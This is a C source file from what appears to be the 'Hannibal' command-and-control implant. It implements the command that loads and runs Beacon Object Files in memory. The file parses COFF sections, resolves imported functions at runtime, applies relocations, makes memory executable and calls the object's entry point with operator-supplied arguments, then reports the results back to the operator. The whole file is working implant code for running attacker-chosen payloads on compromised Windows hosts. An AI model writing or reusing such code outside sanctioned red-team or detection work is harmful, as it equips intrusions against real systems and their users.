#include "BeaconApi.h"
#include "config.h"

#ifdef INCLUDE_CMD_EXECUTE_BOF

#include "hannibal_tasking.h"




#define SIZE_OF_PAGE     0x1000
#define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((SIZE_OF_PAGE - (((ULONG_PTR)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))

typedef struct _SECTION_MAP {
	PVOID Base;
	ULONG Size;
} SECTION_MAP, *PSECTION_MAP; 

typedef struct _OBJECT_CTX {
	union {
		ULONG_PTR Base;
		PIMAGE_FILE_HEADER Header;
	};

	PIMAGE_SYMBOL SymTbl;
	PVOID* SymMap;
	PSECTION_MAP SecMap;
	PIMAGE_SECTION_HEADER Sections;
} OBJECT_CTX, *POBJECT_CTX;

BOOL ReadFileFromDiskA(PINSTANCE hannibal_instance_ptr, char *task_uuid, LPCSTR cFileName, PBYTE* ppFileBuffer, PDWORD pdwFileSize) {

	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;
	PBYTE pBaseAddress = NULL;
		WCHAR DbgString[256] = { 0 };
	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = hannibal_instance_ptr->Win32.CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		// printf("[!] CreateFileA Failed With Error: %ld \n", GetLastError());
			// pic_wsprintf(DbgString, L"[!] CreateFileA Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
			// hannibal_response(DbgString, bof_in_payload->task_uuid);
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = hannibal_instance_ptr->Win32.GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		// printf("[!] GetFileSize Failed With Error: %ld \n", GetLastError());
			// pic_wsprintf(DbgString, L"[!] GetFileSize Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
			// hannibal_response(DbgString, bof_in_payload->task_uuid);
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		// printf("[!] HeapAlloc Failed With Error: %ld \n", GetLastError());
			// pic_wsprintf(DbgString, L"[!] HeapAlloc Failed With Error: %ld \n", hannibal_instance_ptr->Win32.GetLastError());
			// hannibal_response(DbgString, bof_in_payload->task_uuid);
		goto _END_OF_FUNC;
	}

	if (!hannibal_instance_ptr->Win32.ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		// printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
			// pic_wsprintf(DbgString, L"[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", hannibal_instance_ptr->Win32.GetLastError(), dwNumberOfBytesRead, dwFileSize);
			// hannibal_response(DbgString, bof_in_payload->task_uuid);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		hannibal_instance_ptr->Win32.CloseHandle(hFile);

	if (pBaseAddress && !*ppFileBuffer)
		hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), 0x00, pBaseAddress);

	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}


PVOID ObjectResolveSymbol(BOF_IN* bof_in_payload, PSTR Symbol) {
	PSTR Function = { 0 };
	PSTR Library = { 0 };
	PCHAR Position = { 0 };
	CHAR Buffer[ MAX_PATH ] = { 0 };
	PVOID Resolved = { 0 };
	PVOID Module = { 0 };
	WCHAR DbgString[256] = { 0 };


	PINSTANCE hannibal_instance_ptr = bof_in_payload->hannibal_instance;
	char *task_uuid = bof_in_payload->task_uuid;

	if (!Symbol) {
		return NULL;
	}

		//
	// remove the __imp_ 
	//
	Symbol += 6;

	//
	// check if it is an imported Beacon api 
	//
	if (pic_strncmp("Beacon", Symbol, 6) == 0) {
		if (pic_strcmp("BeaconDataParse", Symbol) == 0) {
			Resolved = BeaconDataParse;
		} else if (pic_strcmp("BeaconDataInt", Symbol) == 0) {
			Resolved = BeaconDataInt;
		} else if (pic_strcmp("BeaconDataShort", Symbol) == 0) {
			Resolved = BeaconDataShort;
		} else if (pic_strcmp("BeaconDataLength", Symbol) == 0) {
			Resolved = BeaconDataLength;
		} else if (pic_strcmp("BeaconDataExtract", Symbol) == 0) {
			Resolved = BeaconDataExtract;
		} else if (pic_strcmp("BeaconOutput", Symbol) == 0) {
			Resolved = BeaconOutput;
		} else if (pic_strcmp("BeaconPrintf", Symbol) == 0) {
			Resolved = BeaconPrintf;
		} else if (pic_strcmp("BeaconAddMessage", Symbol) == 0){
			Resolved = BeaconAddMessage;
		} else if (pic_strcmp("BeaconStrcatW", Symbol) == 0) {
			Resolved = BeaconStrcatW;
		} else if (pic_strcmp("BeaconWsprintf", Symbol) == 0) {
			Resolved = BeaconWsprintf;
		} else if (pic_strcmp("BeaconSprintf", Symbol) == 0) {
			Resolved = BeaconSprintf;
		} else if (pic_strcmp("ParseInt32", Symbol) == 0) {
			Resolved = ParseInt32;
		} else if (pic_strcmp("ParseString", Symbol) == 0) {
			Resolved = ParseString;
		} else if (pic_strcmp("ParseWideString", Symbol) == 0) {
			Resolved = ParseWideString;
		}
	} else {
		//
		// resolve an imported/external function using
		// the following syntax "LIBRARY$Function"
		//

		//
		// copy the symbol into the buffer 
		//
		pic_memset(Buffer, 0, MAX_PATH);
		pic_memcpy(Buffer, Symbol, pic_strlen(Symbol));

		//
		// replace the $ with a null byte 
		//
		Position = pic_strchr(Buffer, '$');
		*Position = 0;

		Library = Buffer;
		Function = Position + 1;

		//
		// resolve the library instance
		// from the symbol string
		//
		if (!(Module = hannibal_instance_ptr->Win32.GetModuleHandleA(Library))) {
			if (!(Module = hannibal_instance_ptr->Win32.LoadLibraryA(Library))) {
				// printf("[!] Module not found: %s\n", Library);
			pic_wsprintf(DbgString, L"[!] Module not found: %s\n", Library);
			BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
			return NULL;
			}
		}

		//
		// resolve function from the loaded library 
		//
		if (!(Resolved = hannibal_instance_ptr->Win32.GetProcAddress(Module, Function))) {
			// printf("[!] Function not found inside of %s: %s\n", Library, Function);
			pic_wsprintf(DbgString, L"[!] Function not found inside of %s: %s\n", Library, Function);
			BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
			return NULL;
		}
	}

	// printf(" -> %s @ %p\n", Symbol, Resolved);
	// pic_wsprintf(DbgString, L" -> %s @ %p\n", Symbol, Resolved);
	// hannibal_response(DbgString, bof_in_payload->task_uuid);
	
	pic_RtlSecureZeroMemory(Buffer, sizeof(Buffer));
	// pic_memset(Buffer, 0, sizeof(Buffer));

	return Resolved; 
}

/**
	* @brief
	* calculate the size of virtual memory we need to
	* allocate for the sections and executable code 
	*
	* @param ObjCtx
	* the context of the object file which contains the
	* base address/header, symbol table, and sections.
	*
	* @return
	* required virtual size to allocate
	*/
ULONG ObjectVirtualSize(PINSTANCE hannibal_instance_ptr, char *task_uuid, POBJECT_CTX ObjCtx) {

	PIMAGE_RELOCATION ObjRel = { 0 };
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	ULONG Length = { 0 };

	//
	// calculate the size of sections + align the memory up 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		Length += PAGE_ALIGN(ObjCtx->Sections[i].SizeOfRawData);
	}

	//
	// calculate the function map size 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			//
			// check if the symbol starts with an __imp_
			//
			if (pic_strncmp("__imp_", Symbol, 6) == 0) {
				Length += sizeof(PVOID);
			}

			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return PAGE_ALIGN(Length);
}



VOID ObjectRelocation(PINSTANCE hannibal_instance_ptr, char *task_uuid, ULONG Type,  PVOID Reloc,  PVOID SecBase) {

	ULONG32 Offset32 = { 0 };
	ULONG64 Offset64 = { 0 };

	switch (Type)
	{
	case IMAGE_REL_AMD64_REL32:
		*(PUINT32) Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32));
		break;

	case IMAGE_REL_AMD64_REL32_1:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 1);
		break;

	case IMAGE_REL_AMD64_REL32_2:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 2);
		break;

	case IMAGE_REL_AMD64_REL32_3:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 3);
		break;

	case IMAGE_REL_AMD64_REL32_4:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 4);
		break;

	case IMAGE_REL_AMD64_REL32_5:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 5);
		break;

	case IMAGE_REL_AMD64_ADDR64:
		*(PUINT64)Reloc = (*(PUINT64)(Reloc)) + (ULONG64)SecBase; 
		break;
	}
}

BOOL ObjectProcessSection(BOF_IN* bof_in_payload, POBJECT_CTX ObjCtx) {
	PVOID SecBase = { 0 };
	ULONG SecSize = { 0 };
	PIMAGE_RELOCATION ObjRel = { 0 };
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	PVOID Resolved = { 0 };
	PVOID Reloc = { 0 };
	ULONG FnIndex = { 0 };
   	WCHAR DbgString[256] = { 0 };

	PINSTANCE hannibal_instance_ptr = bof_in_payload->hannibal_instance;
	char* task_uuid = bof_in_payload->task_uuid;

	//
	// process & relocate the object file sections
	// and process symbols and imported functions
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			Reloc = (PVOID)((ULONG_PTR)ObjCtx->SecMap[i].Base + ObjRel->VirtualAddress);
			Resolved = NULL;

			//
			// check if the symbol starts with an __imp_
			//
			if (pic_strncmp("__imp_", Symbol, 6) == 0) {
				//
				// if the symbol starts with __imp_ then
				// resolve the imported function 
				//
				if (!(Resolved = ObjectResolveSymbol(bof_in_payload, Symbol))) {
					// printf("[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
					pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
					BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
					return FALSE;
				}
			}

			//
			// perform relocation on the imported function 
			//
			if (ObjRel->Type == IMAGE_REL_AMD64_REL32 && Resolved) {
				ObjCtx->SymMap[FnIndex] = Resolved;

				*((PUINT32)Reloc) = (UINT32)(((ULONG_PTR)ObjCtx->SymMap + FnIndex * sizeof(PVOID)) - (ULONG_PTR)Reloc - sizeof(UINT32));

				FnIndex++;
			}
			else {
				SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;

				//
				// perform relocation on the section 
				//
				ObjectRelocation(hannibal_instance_ptr, task_uuid, ObjRel->Type, Reloc, SecBase);
			}

			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return TRUE;
}

BOOL ObjectExecute(BOF_IN* bof_in_payload, POBJECT_CTX ObjCtx, PSTR Entry) {

	VOID(*Main)(PBYTE, ULONG, LPCWSTR) = NULL;
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	PVOID SecBase = { 0 };
	ULONG SecSize = { 0 };
	ULONG Protect = { 0 };
   	WCHAR DbgString[256] = { 0 };
	PINSTANCE hannibal_instance_ptr = bof_in_payload->hannibal_instance;
	char* task_uuid = bof_in_payload->task_uuid;
	PBYTE Args = bof_in_payload->args;
	ULONG Argc = bof_in_payload->argc;

	for (int i = 0; i < ObjCtx->Header->NumberOfSymbols; i++) {
		ObjSym = &ObjCtx->SymTbl[i];

		//
		// get the symbol name 
		//
		if (ObjSym->N.Name.Short) {
			//
			// short name (8 bytes)
			//
			Symbol = (PSTR)ObjSym->N.ShortName;
		}
		else {
			//
			// long name (over 8 bytes) so we get to get
			// the symbol string via its offset 
			//
			Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
		}

		//
		// check if it is a function defined
		// inside of the object file 
		//
		if (ISFCN(ObjCtx->SymTbl[i].Type) && pic_strcmp(Symbol, Entry) == 0) {
			//
			// get the section and change it to be executable
			// 
			SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;
			SecSize = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Size;

			//
			// make the section executable
			//
			if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect)) {
				// printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
				pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
				BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
				break;
			}

			//
			// execute the bof entry point 
			//
			Main = (PVOID)((ULONG_PTR)(SecBase) + ObjSym->Value);
			Main(Args, Argc, bof_in_payload->buffer_message);

			//
			// revert the old section protection 
			//
			if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
				// printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
				pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
				BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
				break;
			}
			return TRUE; 
		}
	}
	return FALSE;
}

BOOL ObjectLdr(BOF_IN* bof_in_payload, PSTR sFunction) {

	OBJECT_CTX ObjCtx = { 0 };
	ULONG VirtSize = { 0 };
	PVOID VirtAddr = { 0 };
	PVOID SecBase = { 0 };
	ULONG SecSize = { 0 };
	BOOL Success = FALSE;
    WCHAR DbgString[256] = { 0 };

	PVOID pObject = bof_in_payload->pbof_content;
	PBYTE pArgs = bof_in_payload->args;
	ULONG uArgc = bof_in_payload->argc;
	PINSTANCE hannibal_instance_ptr = bof_in_payload->hannibal_instance;
	char* task_uuid = bof_in_payload->task_uuid;

	//
	// sanity check arguments 
	//
	if (!pObject || !sFunction) {
		return FALSE;
	}

	//
	// parse the header file, symbol table
	// and sections from the object file 
	//
	ObjCtx.Header = (PIMAGE_FILE_HEADER)pObject;
	ObjCtx.SymTbl = (PIMAGE_SYMBOL)((ULONG_PTR)pObject + (ULONG_PTR)ObjCtx.Header->PointerToSymbolTable);
	ObjCtx.Sections = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pObject + sizeof(IMAGE_FILE_HEADER));

#ifdef _M_X64
	//
	// validate that the object file matches
	// the architecture of the current process 
	//
	if (ObjCtx.Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
		// printf("[*] object file is not x64");
		pic_wsprintf(DbgString, L"[*] object file is not x64");
		BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
		return FALSE;
	}
#else
	// puts("[!] Do not support x86");
    hannibal_response(L"[!] Do not support x86", task_uuid);
	return FALSE;
#endif
	VirtSize = ObjectVirtualSize(hannibal_instance_ptr, task_uuid, &ObjCtx);

	if (!(VirtAddr = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, VirtSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		pic_wsprintf(DbgString, L"[!] VirtualAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
		BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
		goto _END_OF_CODE;
	}

	//
	// allocate heap memory to store
	// the section map array 
	//
	if (!(ObjCtx.SecMap = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP)))) {
		pic_wsprintf(DbgString, L"[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
		BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
		goto _END_OF_CODE;
	}

	//
	// set the section base to
	// the allocate memory 
	//
	SecBase = VirtAddr;

	//
	// copy over the sections 
	//
	for (int i = 0; i < ObjCtx.Header->NumberOfSections; i++) {
		ObjCtx.SecMap[i].Size = SecSize = ObjCtx.Sections[i].SizeOfRawData;
		ObjCtx.SecMap[i].Base = SecBase;

		//
		// copy over the section data to
		// the newly allocated memory region
		//
		pic_memcpy(SecBase, (PVOID)(ObjCtx.Base + (ULONG_PTR)ObjCtx.Sections[i].PointerToRawData), SecSize);
		//
		// get the next page entry to write our
		// object data section into
		//
		SecBase = (PVOID)PAGE_ALIGN(((ULONG_PTR)SecBase + SecSize));
	}

	//
	// last page of the object memory is the symbol/function map
	//
	ObjCtx.SymMap = SecBase;

	if (!(Success = ObjectProcessSection(bof_in_payload, &ObjCtx))) {
		BeaconAddMessage(bof_in_payload->buffer_message, L"[!] Failed to process sections\n");
		goto _END_OF_CODE;
	}

	if (!(Success = ObjectExecute(bof_in_payload, &ObjCtx, sFunction))) {
		// printf("[!] Failed to execute function: %s\n", sFunction);
		pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
		BeaconAddMessage(bof_in_payload->buffer_message, DbgString);
		goto _END_OF_CODE;
	}

_END_OF_CODE:
	if (VirtAddr) {
		hannibal_instance_ptr->Win32.VirtualFree(VirtAddr, 0, MEM_RELEASE);
		VirtAddr = NULL;
	}

	if (ObjCtx.SecMap) {
		hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.SecMap);
		ObjCtx.SecMap = NULL;
	}

	//
	// clear the struct context from the stack
	//
	pic_RtlSecureZeroMemory(&ObjCtx, sizeof(ObjCtx));
	// pic_memset(&ObjCtx, 0, sizeof(ObjCtx));

	return Success;
}

int do_bof(BOF_IN* bof_payload)
{
	WCHAR DbgString[256] = { 0 };	

	// pic_wsprintf(DbgString, L"[*] Loading object file from memory...");
	// hannibal_response(DbgString, bof_payload->controller_uuid);

	if (!ObjectLdr(bof_payload, "go")) {
		BeaconAddMessage(bof_payload->buffer_message, L"[!] Failed to execute object file\n");
		// hannibal_response(DbgString, bof_payload->task_uuid);
	}
	else {
		BeaconAddMessage(bof_payload->buffer_message, L"[+] Successfully executed object file\n");
	}

END:
	return 0;
}

SECTION_CODE void cmd_bof(TASK t)
{
	HANNIBAL_INSTANCE_PTR

	CMD_EXECUTE_BOF *exec_bof = (CMD_EXECUTE_BOF *)t.cmd;

	BOF_IN *bof_in_payload = (BOF_IN *)hannibal_instance_ptr->Win32.VirtualAlloc(
		NULL,
		sizeof(BOF_IN *),
		MEM_COMMIT,
		PAGE_READWRITE
	);

	LPCWSTR message_content = (LPCWSTR)hannibal_instance_ptr->Win32.VirtualAlloc(
		NULL,
		0x1000,
		MEM_COMMIT,
		PAGE_READWRITE
	);
	
	bof_in_payload->args = exec_bof->args;
	bof_in_payload->argc = exec_bof->argc;
	bof_in_payload->hannibal_instance = hannibal_instance_ptr;
	bof_in_payload->buffer_message = message_content;
	bof_in_payload->pbof_content = exec_bof->bof;
	bof_in_payload->task_uuid = t.task_uuid;

	// real function
	do_bof(bof_in_payload);

	// If you don't put a task response in the response queue, the uuid won't
    // get freed and that is a leak. Either do it in there or here.

    // TASK response_t;

    // response_t.output = (LPCSTR)response_content;
    // response_t.output_size = CURRENT_BUFFER_USAGE;
    // response_t.task_uuid = t.task_uuid;

    // task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

	hannibal_instance_ptr->Win32.VirtualFree(bof_in_payload, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
	// hannibal_instance_ptr->Win32.VirtualFree(t.task_uuid, 0, MEM_RELEASE); // Make sure your hbin sends a response so this gets freed in post_tasks
	hannibal_response(message_content, t.task_uuid);
	hannibal_instance_ptr->Win32.VirtualFree(message_content, 0, MEM_RELEASE);
}

#endif